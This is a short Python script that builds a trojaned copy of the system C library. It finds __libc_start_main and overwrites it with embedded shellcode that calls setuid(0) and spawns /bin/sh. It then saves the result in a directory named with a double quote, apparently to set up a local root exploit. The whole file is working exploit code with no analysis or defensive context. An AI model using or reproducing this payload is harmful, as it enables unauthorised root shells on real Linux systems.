import subprocess
import os

libc_path = '/lib/x86_64-linux-gnu/libc.so.6'

nm = subprocess.check_output(['nm', '-D', libc_path])
libc_start_main = [x for x in nm.splitlines() if b'__libc_start_main@@GLIBC_2.34' in x][0]
offset = int(libc_start_main.split(b' ')[0], 16)

lib = open(libc_path, 'rb').read()

s = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
# https://shell-storm.org/shellcode/files/shellcode-77.html

libx = lib[:offset] + s + lib[offset+len(s):]

os.mkdir('./"')
open('./"/libc.so.6', 'wb').write(libx)